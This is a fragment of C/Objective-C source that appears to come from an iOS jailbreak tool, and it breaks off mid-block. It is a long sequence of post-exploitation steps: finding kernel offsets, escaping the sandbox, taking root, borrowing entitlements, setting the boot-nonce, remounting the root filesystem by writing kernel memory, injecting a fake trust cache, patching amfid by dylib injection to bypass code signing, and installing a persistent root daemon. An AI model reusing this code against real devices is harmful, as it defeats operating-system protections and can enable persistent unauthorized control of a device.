    uint64_t vfs_context = 0;
    uint64_t devVnode = 0;
    uint64_t rootfs_vnode = 0;
    uint64_t v_mount = 0;
    uint32_t v_flag = 0;
    FILE *a = NULL;
    int fd = 0;
    int i = 0;
    char *dev_path = NULL;
    struct trust_mem mem;
    size_t length = 0;
    uint64_t kernel_trust = 0;
    struct utsname u = { 0 };
    
    {
        // Initialize patchfinder64.
        
        LOG("Initializing patchfinder64...");
        PROGRESS("Exploiting... (2/48)", 0, 0);
        rv = init_kernel(kernel_base, NULL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully initialized patchfinder64.");
    }
    
    {
        // Find offsets.
        
        LOG("Finding offsets...");
        PROGRESS("Exploiting... (3/48)", 0, 0);
        offsets.trust_chain = find_trustcache();
        LOG("trust_chain: " ADDR "\n", offsets.trust_chain);
        _assert(offsets.trust_chain);
        offsets.amficache = find_amficache();
        LOG("amficache: " ADDR "\n", offsets.amficache);
        _assert(offsets.amficache);
        offsets.OSBoolean_True = find_OSBoolean_True();
        LOG("OSBoolean_True: " ADDR "\n", offsets.OSBoolean_True);
        _assert(offsets.OSBoolean_True);
        offsets.OSBoolean_False = find_OSBoolean_False();
        LOG("OSBoolean_False: " ADDR "\n", offsets.OSBoolean_False);
        _assert(offsets.OSBoolean_False);
        offsets.osunserializexml = find_osunserializexml();
        LOG("osunserializexml: " ADDR "\n", offsets.osunserializexml);
        _assert(offsets.osunserializexml);
        offsets.smalloc = find_smalloc();
        LOG("smalloc: " ADDR "\n", offsets.smalloc);
        _assert(offsets.smalloc);
        offsets.allproc = find_allproc();
        LOG("allproc: " ADDR "\n", offsets.allproc);
        _assert(offsets.allproc);
        offsets.add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
        LOG("add_x0_x0_0x40_ret: " ADDR "\n", offsets.add_x0_x0_0x40_ret);
        _assert(offsets.add_x0_x0_0x40_ret);
        offsets.rootvnode = find_rootvnode();
        LOG("rootvnode: " ADDR "\n", offsets.rootvnode);
        _assert(offsets.rootvnode);
        offsets.zone_map_ref = find_zone_map_ref();
        LOG("zone_map_ref: " ADDR "\n", offsets.zone_map_ref);
        _assert(offsets.zone_map_ref);
        offsets.vfs_context_current = find_vfs_context_current();
        LOG("vfs_context_current: " ADDR "\n", offsets.vfs_context_current);
        _assert(offsets.vfs_context_current);
        offsets.vnode_lookup = find_vnode_lookup();
        LOG("vnode_lookup: " ADDR "\n", offsets.vnode_lookup);
        _assert(offsets.vnode_lookup);
        offsets.vnode_put = find_vnode_put();
        LOG("vnode_put: " ADDR "\n", offsets.vnode_put);
        _assert(offsets.vnode_put);
        LOG("Successfully found offsets.");
    }
    
    {
        // Deinitialize patchfinder64.
        
        LOG("Deinitializing patchfinder64...");
        PROGRESS("Exploiting... (4/48)", 0, 0);
        term_kernel();
        LOG("Successfully deinitialized patchfinder64.");
    }
    
    {
        // Initialize QiLin.
        
        LOG("Initializing QiLin...");
        PROGRESS("Exploiting... (5/48)", 0, 0);
        rv = initQiLin(tfp0, kernel_base);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully initialized QiLin.");
    }
    
    {
        // Rootify myself.
        
        LOG("Rootifying myself...");
        PROGRESS("Exploiting... (6/48)", 0, 0);
        rv = rootifyMe();
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully rootified myself.");
    }
    
    {
        // Platformize myself.
        
        LOG("Platformizing myself...");
        PROGRESS("Exploiting... (7/48)", 0, 0);
        rv = platformizeMe();
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully platformized myself.");
    }
    
    {
        // Escape Sandbox.
        
        LOG("Escaping Sandbox...");
        PROGRESS("Exploiting... (8/48)", 0, 0);
        ShaiHuludMe(0);
        LOG("Successfully escaped Sandbox.");
    }
    
    {
        // Write a test file to UserFS.
        
        LOG("Writing a test file to UserFS...");
        PROGRESS("Exploiting... (9/48)", 0, 0);
        if (!access("/var/mobile/test.txt", F_OK)) {
            rv = unlink("/var/mobile/test.txt");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen("/var/mobile/test.txt", "w");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/var/mobile/test.txt", 0644);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/var/mobile/test.txt", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = unlink("/var/mobile/test.txt");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully wrote a test file to UserFS.");
    }
    
    {
        // Borrow entitlements from sysdiagnose.
        
        LOG("Borrowing entitlements from sysdiagnose...");
        PROGRESS("Exploiting... (10/48)", 0, 0);
        borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", "--help");
        LOG("Successfully borrowed entitlements from sysdiagnose.");
        
        // We now have Task_for_pid.
    }
    
    {
        if (dump_apticket) {
            // Dump APTicket.
            
            LOG("Dumping APTicket...");
            PROGRESS("Exploiting... (11/48)", 0, 0);
            rv = [[NSData dataWithContentsOfFile:@"/System/Library/Caches/apticket.der"] writeToFile:[NSString stringWithFormat:@"%@/Documents/apticket.der", NSHomeDirectory()] atomically:YES];
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 1);
            LOG("Successfully dumped APTicket.");
        }
    }
    
    {
        // Unlock nvram.
        
        LOG("Unlocking nvram...");
        PROGRESS("Exploiting... (12/48)", 0, 0);
        rv = unlocknvram();
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully unlocked nvram.");
    }
    
    {
        // Set boot-nonce.
        
        LOG("Setting boot-nonce...");
        PROGRESS("Exploiting... (13/48)", 0, 0);
        rv = execCommandAndWait("/usr/sbin/nvram", "com.apple.System.boot-nonce", NULL, NULL, NULL, NULL);
        LOG("rv: " "%d" "\n", rv);
        if (overwrite_boot_nonce || rv == 512) {
            rv = execCommandAndWait("/usr/sbin/nvram", strdup([[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", boot_nonce] UTF8String]), NULL, NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = execCommandAndWait("/usr/sbin/nvram", "IONVRAM-FORCESYNCNOW-PROPERTY=com.apple.System.boot-nonce", NULL, NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        LOG("Successfully set boot-nonce.");
    }
    
    {
        // Lock nvram.
        
        LOG("Locking nvram...");
        PROGRESS("Exploiting... (14/48)", 0, 0);
        rv = locknvram();
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully locked nvram.");
    }
    
    {
        // Initialize kexecute.
        
        LOG("Initializing kexecute...");
        PROGRESS("Exploiting... (15/48)", 0, 0);
        init_kexecute(offsets.add_x0_x0_0x40_ret);
        LOG("Successfully initialized kexecute.");
    }
    
    {
        // Get vfs_context.
        
        LOG("Getting vfs_context...");
        PROGRESS("Exploiting... (16/48)", 0, 0);
        vfs_context = _vfs_context(offsets.vfs_context_current, offsets.zone_map_ref);
        LOG("vfs_context: " ADDR "\n", vfs_context);
        _assert(vfs_context);
        LOG("Successfully got vfs_context.");
    }
    
    {
        // Get dev vnode.
        
        LOG("Getting dev vnode...");
        PROGRESS("Exploiting... (17/48)", 0, 0);
        devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", offsets.vnode_lookup);
        LOG("devVnode: " ADDR "\n", devVnode);
        _assert(devVnode);
        LOG("Successfully got dev vnode.");
    }
    
    {
        // Clear dev vnode's si_flags.
        
        LOG("Clearing dev vnode's si_flags...");
        PROGRESS("Exploiting... (18/48)", 0, 0);
        wk32(rk64(devVnode + 0x78) + 0x10, 0);
        LOG("Successfully cleared dev vnode's si_flags.");
    }
    
    {
        // Clean up dev vnode.
        
        LOG("Cleaning up dev vnode...");
        PROGRESS("Exploiting... (19/48)", 0, 0);
        rv = _vnode_put(offsets.vnode_put, devVnode);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully cleaned up dev vnode.");
    }
    
    {
        // Deinitialize kexecute.
        
        LOG("Deinitializing kexecute...");
        PROGRESS("Exploiting... (20/48)", 0, 0);
        term_kexecute();
        LOG("Successfully deinitialized kexecute.");
    }
    
    {
        // Remount RootFS.
        
        LOG("Remounting RootFS...");
        PROGRESS("Exploiting... (21/48)", 0, 0);
        fd = open("/", O_RDONLY, 0);
        LOG("fd: " "%d" "\n", fd);
        _assert(fd > 0);
        i = snapshot_list(fd);
        LOG("i: " "%d" "\n", rv);
        rv = close(fd);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (i == -1) {
            if (!access("/var/tmp/rootfsmnt", F_OK)) {
                rv = rmdir("/var/tmp/rootfsmnt");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
            rv = mkdir("/var/tmp/rootfsmnt", 0755);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = spawnAndShaiHulud("/sbin/mount_apfs", "/dev/disk0s1s1", "/var/tmp/rootfsmnt", NULL, NULL, NULL);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            
            // Borrow entitlements from fsck_apfs.
            
            LOG("Borrowing entitlements from fsck_apfs...");
            PROGRESS("Exploiting... (22/48)", 0, 0);
            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
            LOG("Successfully borrowed entitlements from fsck_apfs.");
            
            // We now have fs_snapshot_rename.
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot...");
            PROGRESS("Exploiting... (23/48)", 0, 0);
            fd = open("/var/tmp/rootfsmnt", O_RDONLY, 0);
            LOG("fd: " "%d" "\n", fd);
            _assert(fd > 0);
            rv = fs_snapshot_rename(fd, systemSnapshot(), "orig-fs", 0);
            _assert(errno == 2 || rv == 0);
            rv = fs_snapshot_create(fd, "orig-fs", 0);
            _assert(errno == 17 || rv == 0);
            rv = close(fd);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully renamed system snapshot.");
            
            // Reboot.
            
            LOG("Rebooting...");
            PROGRESS("Exploiting... (24/48)", 0, 0);
            NOTICE("The device will be restarted.", 1);
            rv = reboot(0x400);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully rebooted.");
        }
        rootfs_vnode = rk64(offsets.rootvnode);
        v_mount = rk64(rootfs_vnode + 0xd8);
        v_flag = rk32(v_mount + 0x70);
        v_flag = v_flag & ~MNT_NOSUID;
        v_flag = v_flag & ~MNT_RDONLY;
        wk32(v_mount + 0x70, v_flag & ~MNT_ROOTFS);
        dev_path = "/dev/disk0s1s1";
        rv = mount("apfs", "/", MNT_UPDATE, (void *)&dev_path);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        v_mount = rk64(rootfs_vnode + 0xd8);
        wk32(v_mount + 0x70, v_flag);
        LOG("Successfully remounted RootFS.");
    }
    
    {
        // Write a test file to RootFS.
        
        LOG("Writing a test file to RootFS...");
        PROGRESS("Exploiting... (25/48)", 0, 0);
        if (!access("/test.txt", F_OK)) {
            rv = unlink("/test.txt");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen("/test.txt", "w");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/test.txt", 0644);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/test.txt", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = unlink("/test.txt");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully wrote a test file to RootFS.");
    }
    
    {
        if ((!access("/.bootstrapped_electra", F_OK) && !access("/electra", F_OK)) || restore_rootfs) {
            // Borrow entitlements from fsck_apfs.
            
            LOG("Borrowing entitlements from fsck_apfs...");
            PROGRESS("Exploiting... (26/48)", 0, 0);
            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
            LOG("Successfully borrowed entitlements from fsck_apfs.");
            
            // We now have fs_snapshot_rename.
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot back...");
            PROGRESS("Exploiting... (27/48)", 0, 0);
            fd = open("/", O_RDONLY, 0);
            LOG("fd: " "%d" "\n", fd);
            _assert(fd > 0);
            rv = fs_snapshot_rename(fd, "electra-prejailbreak", systemSnapshot(), 0);
            _assert(errno == 2 || rv == 0);
            rv = fs_snapshot_rename(fd, "orig-fs", systemSnapshot(), 0);
            _assert(errno == 17 || rv == 0);
            rv = close(fd);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully renamed system snapshot back.");
            
            // Clean up UserFS.
            
            LOG("Cleaning up UserFS...");
            PROGRESS("Exploiting... (28/48)", 0, 0);
            if (!access("/var/lib", F_OK)) {
                rv = [[NSFileManager defaultManager] removeItemAtPath:@"/var/lib" error:nil];
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 1);
            }
            if (!access("/var/stash", F_OK)) {
                rv = [[NSFileManager defaultManager] removeItemAtPath:@"/var/stash" error:nil];
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 1);
            }
            if (!access("/var/db/stash", F_OK)) {
                rv = [[NSFileManager defaultManager] removeItemAtPath:@"/var/db/stash" error:nil];
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 1);
            }
            LOG("Successfully cleaned up UserFS.");
            
            // Disallow SpringBoard to show non-default system apps.
            
            LOG("Disallowing SpringBoard to show non-default system apps...");
            PROGRESS("Exploiting... (29/48)", 0, 0);
            md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
            _assert(md != nil);
            if (![md[@"SBShowNonDefaultSystemApps"] isEqual:@(NO)]) {
                md[@"SBShowNonDefaultSystemApps"] = @(NO);
                rv = [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 1);
            }
            LOG("Successfully disallowed SpringBoard to show non-default system apps.");
            
            // Reboot.
            
            LOG("Rebooting...");
            PROGRESS("Exploiting... (30/48)", 0 ,0);
            NOTICE("The device will be restarted.", 1);
            rv = reboot(0x400);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            LOG("Successfully rebooted.");
        }
    }
    
    {
        // Copy over our resources to RootFS.
        
        LOG("Copying over our resources to RootFS...");
        PROGRESS("Exploiting... (32/48)", 0, 0);
        if (access("/jb", F_OK)) {
            rv = mkdir("/jb", 0755);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
            rv = chown("/jb", 0, 0);
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        
        if (!access("/electra", F_OK)) {
            rv = [[NSFileManager defaultManager] removeItemAtPath:@"/electra" error:nil];
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 1);
        }
        rv = symlink("/jb", "/electra");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        rv = chdir("/jb");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/amfid_payload.dylib", F_OK)) {
            rv = unlink("/jb/amfid_payload.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"amfid_payload" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "amfid_payload");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/amfid_payload.dylib", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/amfid_payload.dylib", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/launchctl", F_OK)) {
            rv = unlink("/jb/launchctl");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"launchctl" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "launchctl");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/launchctl", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/launchctl", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/jailbreakd", F_OK)) {
            rv = unlink("/jb/jailbreakd");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"jailbreakd" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "jailbreakd");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/jailbreakd", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/jailbreakd", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/libjailbreak.dylib", F_OK)) {
            rv = unlink("/jb/libjailbreak.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"libjailbreak" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "libjailbreak");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/libjailbreak.dylib", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/libjailbreak.dylib", 501, 501);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/pspawn_hook.dylib", F_OK)) {
            rv = unlink("/jb/pspawn_hook.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"pspawn_hook" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "pspawn_hook");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/pspawn_hook.dylib", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/pspawn_hook.dylib", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/tar", F_OK)) {
            rv = unlink("/jb/tar");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"tar" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "tar");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/tar", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/tar", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/lzma", F_OK)) {
            rv = unlink("/jb/lzma");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"lzma" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "lzma");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/lzma", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/lzma", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/jb/spawn", F_OK)) {
            rv = unlink("/jb/spawn");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"spawn" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "spawn");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/spawn", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/spawn", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        
        if (!access("/var/tmp/strap.tar.lzma", F_OK)) {
            rv = unlink("/var/tmp/strap.tar.lzma");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = copyfile([[[NSBundle mainBundle] pathForResource:@"strap.tar" ofType:@"lzma"] UTF8String], "/var/tmp/strap.tar.lzma", 0, COPYFILE_ALL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/var/tmp/strap.tar.lzma", 0644);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/var/tmp/strap.tar.lzma", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully copied over our resources to RootFS.");
        
        if (!access("/jb/debugserver", F_OK)) {
            rv = unlink("/jb/debugserver");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        a = fopen([[[NSBundle mainBundle] pathForResource:@"debugserver" ofType:@"tar"] UTF8String], "rb");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        untar(a, "debugserver");
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chmod("/jb/debugserver", 0755);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/jb/debugserver", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
    }
    
    {
        // Inject trust cache
        
        PROGRESS("Exploiting... (33/48)", 0, 0);
        printf("trust_chain = 0x%llx\n", offsets.trust_chain);
        
        mem.next = rk64(offsets.trust_chain);
        *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
        *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
        
        rv = grab_hashes("/jb", kread, offsets.amficache, mem.next);
        printf("rv = %d, numhash = %d\n", rv, numhash);
        
        length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
        kernel_trust = kmem_alloc(length);
        printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);
        
        mem.count = numhash;
        kwrite(kernel_trust, &mem, sizeof(mem));
        kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
        wk64(offsets.trust_chain, kernel_trust);
        
        free(allhash);
        free(allkern);
        free(amfitab);
    }
    
    {
        // Log slide.
        
        LOG("Logging slide...");
        PROGRESS("Exploiting... (34/48)", 0, 0);
        a = fopen("/tmp/slide.txt", "w+");
        LOG("a: " "%p" "\n", a);
        _assert(a != NULL);
        fprintf(a, ADDR "\n", kernel_base - KERNEL_SEARCH_ADDRESS);
        rv = chmod("/tmp/slide.txt", 0644);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = chown("/tmp/slide.txt", 0, 0);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = fclose(a);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully logged slide.");
    }
    
    {
        // Set HSP4.
        
        LOG("Setting HSP4...");
        PROGRESS("Exploiting... (35/48)", 0, 0);
        rv = remap_tfp0_set_hsp4(&tfp0, offsets.zone_map_ref);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        LOG("Successfully set HSP4.");
    }
    
    {
        if (export_kernel_task_port) {
            // Export Kernel Task Port.
            PROGRESS("Exploiting... (36/48)", 0, 0);
            LOG("Exporting Kernel Task Port...");
            make_host_into_host_priv();
            LOG("Successfully Exported Kernel Task Port.");
        }
    }
    
    {
        // Patch amfid.
        
        LOG("Patching amfid...");
        PROGRESS("Exploiting... (37/48)", 0, 0);
        if (!access("/var/tmp/amfid_payload.alive", F_OK)) {
            rv = unlink("/var/tmp/amfid_payload.alive");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = inject_library(findPidOfProcess("amfid"), "/jb/amfid_payload.dylib");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = access("/var/tmp/amfid_payload.alive", F_OK);
        LOG("rv: " "%d" "\n", rv);
        for (i = 0; !(i >= 20 || rv == 0); i++) {
            LOG("Waiting for amfid...");
            usleep(100000);
            rv = access("/var/tmp/amfid_payload.alive", F_OK);
            LOG("rv: " "%d" "\n", rv);
        }
        _assert(rv == 0);
        LOG("Successfully patched amfid.");
    }
    
    {
        // Spawn jailbreakd.
        
        LOG("Spawning jailbreakd...");
        PROGRESS("Exploiting... (38/48)", 0, 0);
        if (!access("/usr/lib/libjailbreak.dylib", F_OK)) {
            rv = unlink("/usr/lib/libjailbreak.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = symlink("/jb/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        if (!access("/bin/launchctl", F_OK)) {
            rv = unlink("/bin/launchctl");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = rename("/jb/launchctl", "/bin/launchctl");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        if (!access("/jb/jailbreakd.plist", F_OK)) {
            rv = unlink("/jb/jailbreakd.plist");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        md = [[NSMutableDictionary alloc] init];
        md[@"Label"] = @"jailbreakd";
        md[@"Program"] = @"/jb/jailbreakd";
        md[@"EnvironmentVariables"] = [[NSMutableDictionary alloc] init];
        md[@"EnvironmentVariables"][@"KernelBase"] = [NSString stringWithFormat:@ADDR, kernel_base];
        md[@"EnvironmentVariables"][@"KernProcAddr"] = [NSString stringWithFormat:@ADDR, rk64(findKernelSymbol("_kernproc"))];
        md[@"EnvironmentVariables"][@"ZoneMapOffset"] = [NSString stringWithFormat:@ADDR, offsets.zone_map_ref - (kernel_base - KERNEL_SEARCH_ADDRESS)];
        md[@"EnvironmentVariables"][@"AddRetGadget"] = [NSString stringWithFormat:@ADDR, offsets.add_x0_x0_0x40_ret];
        md[@"EnvironmentVariables"][@"OSBooleanTrue"] = [NSString stringWithFormat:@ADDR, offsets.OSBoolean_True];
        md[@"EnvironmentVariables"][@"OSBooleanFalse"] = [NSString stringWithFormat:@ADDR, offsets.OSBoolean_False];
        md[@"EnvironmentVariables"][@"OSUnserializeXML"] = [NSString stringWithFormat:@ADDR, offsets.osunserializexml];
        md[@"EnvironmentVariables"][@"Smalloc"] = [NSString stringWithFormat:@ADDR, offsets.smalloc];
        md[@"UserName"] = @"root";
        md[@"MachServices"] = [[NSMutableDictionary alloc] init];
        md[@"MachServices"][@"zone.sparkes.jailbreakd"] = [[NSMutableDictionary alloc] init];
        md[@"MachServices"][@"zone.sparkes.jailbreakd"][@"HostSpecialPort"] = @(15);
        md[@"RunAtLoad"] = @(YES);
        md[@"KeepAlive"] = @(YES);
        md[@"StandardErrorPath"] = @"/var/log/jailbreakd-stderr.log";
        md[@"StandardOutPath"] = @"/var/log/jailbreakd-stdout.log";
        rv = [md writeToFile:@"/jb/jailbreakd.plist" atomically:YES];
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 1);
        if (!access("/var/log/jailbreakd-stderr.log", F_OK)) {
            rv = unlink("/var/log/jailbreakd-stderr.log");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        if (!access("/var/log/jailbreakd-stdout.log", F_OK)) {
            rv = unlink("/var/log/jailbreakd-stdout.log");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        if (!access("/var/tmp/jailbreakd.pid", F_OK)) {
            rv = unlink("/var/tmp/jailbreakd.pid");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = execCommandAndWait("/bin/launchctl", "load", "/jb/jailbreakd.plist", NULL, NULL, NULL);
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        rv = access("/var/tmp/jailbreakd.pid", F_OK);
        LOG("rv: " "%d" "\n", rv);
        for (i = 0; !(i >= 20 || rv == 0); i++) {
            LOG("Waiting for jailbreakd...");
            usleep(100000);
            rv = access("/var/tmp/jailbreakd.pid", F_OK);
            LOG("rv: " "%d" "\n", rv);
        }
        _assert(rv == 0);
        LOG("Successfully spawned jailbreakd.");
    }
    
    {
        // Patch launchd.
        
        if (!access("/usr/lib/pspawn_hook.dylib", F_OK)) {
            rv = unlink("/usr/lib/pspawn_hook.dylib");
            LOG("rv: " "%d" "\n", rv);
            _assert(rv == 0);
        }
        rv = symlink("/jb/pspawn_hook.dylib", "/usr/lib/pspawn_hook.dylib");
        LOG("rv: " "%d" "\n", rv);
        _assert(rv == 0);
        if (load_tweaks) {
            LOG("Patching launchd...");
            PROGRESS("Exploiting... (39/48)", 0, 0);
            if (!access("/var/log/pspawn_hook_launchd.log", F_OK)) {
                rv = unlink("/var/log/pspawn_hook_launchd.log");
                LOG("rv: " "%d" "\n", rv);
                _assert(rv == 0);
            }
